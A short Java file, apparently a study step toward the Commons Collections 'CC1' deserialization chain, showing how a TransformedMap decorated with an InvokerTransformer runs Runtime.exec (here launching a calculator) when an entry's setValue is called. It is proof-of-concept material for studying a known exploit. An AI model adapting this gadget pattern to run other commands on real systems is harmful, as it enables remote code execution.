package cc1.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class SetValueTest {
    public static void main(String[] args) throws Exception {
        String cmd = "/usr/bin/gnome-calculator";
        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{cmd}
        );
        Runtime input = Runtime.getRuntime();
        HashMap<Object,Object> hashMap =new HashMap<>();
        hashMap.put("a",1); // ensure Map.Entry entry not empty
        Map<Object,Object>decoratedMap = (TransformedMap) TransformedMap.decorate(
                hashMap,null, invokerTransformer
        );
        // foreach entry to trigger setValue
        for(Map.Entry entry : decoratedMap.entrySet()){
            entry.setValue(input);
        }

    }
}
